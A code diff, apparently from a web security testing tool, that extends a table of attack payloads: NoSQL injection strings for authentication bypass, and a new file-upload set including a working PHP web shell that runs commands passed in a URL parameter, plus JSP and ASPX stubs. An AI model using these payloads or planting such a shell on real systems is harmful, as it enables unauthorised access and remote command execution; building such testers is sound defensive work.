@@ -37,6 +37,23 @@ const payloadsByType = {
     '{"$regex": ".*"}',
     '{"$where": "1==1"}',
     '{"username": {"$ne": ""}, "password": {"$ne": ""}}'
+  ],
+  fileupload: [
+    {
+      name: 'shell.php',
+      content: '<?php system($_GET["cmd"]); ?>',
+      mimeType: 'application/x-php'
+    },
+    {
+      name: 'shell.jsp',
+      content: '<%@ page import="java.io.*" %><% String cmd = request.getParameter("c"); %>',
+      mimeType: 'application/octet-stream'
+    },
+    {
+      name: 'shell.aspx',
+      content: '<%@ Page Language="C#" %><% Response.Write("test"); %>',
+      mimeType: 'application/octet-stream'
+    }
   ]
 };
 
